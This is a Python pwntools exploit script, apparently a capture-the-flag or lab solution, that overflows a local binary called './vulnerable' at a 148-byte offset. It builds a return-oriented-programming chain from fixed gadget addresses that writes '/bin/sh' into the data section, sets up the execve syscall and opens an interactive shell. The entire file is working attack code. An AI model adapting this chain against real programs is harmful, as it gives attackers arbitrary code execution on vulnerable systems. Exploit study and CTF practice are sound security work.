from pwn import *
import sys

binary = ELF("./vulnerable", checksec=False)
io = process('./vulnerable')
eip_offset = 148

payload = ""
payload += "A" * eip_offset # Junk to EIP

"""
EXECVE
eax: 11
ebx: address to "/bin/sh"
ecx: 0
edx: 0
"""

def write_to_eax(value):
    payload = ""
    payload += p32(0x080706da) # pop edx; ret
    payload += value
    payload += p32(0x08069c2f) # nop ; mov eax, edx ; ret
    return payload

def write_to_edx(value):
    payload = p32(0x80706da) # pop edx; rer
    payload += value # ... start of data section address
    return payload

def write(address, value):
    payload =  write_to_eax(value)
    payload += write_to_edx(address)
    payload += p32(0x805572b) # mov [edx], eax
    return payload

# Write /bin/sh
payload += write(p32(binary.symbols['data']), "/bin")
payload += write(p32(binary.symbols['data'] + 4), "/sh\x00")

# SYSCALL

# Set eax to 11
payload += p32(0x08054e40) # xor eax, eax; ret
payload += 11 * p32(0x0807ce2e) # inc eax; ret

# Set ebx to address of /bin/sh and ecx to 0
payload += p32(0x08070701) # pop ecx; pop ebx; ret
payload += "\x00\x00\x00\x00" # 0
payload += p32(binary.symbols['data']) # address of /bin/sh

# Set edx to 0
payload += p32(0x080706da) # pop edx; ret
payload += "\x00\x00\x00\x00"

# Make syscall
payload += p32(0x0806df7c) # int 0x80

#sys.stderr.write(payload+"\n")

io.sendline(payload)
io.interactive()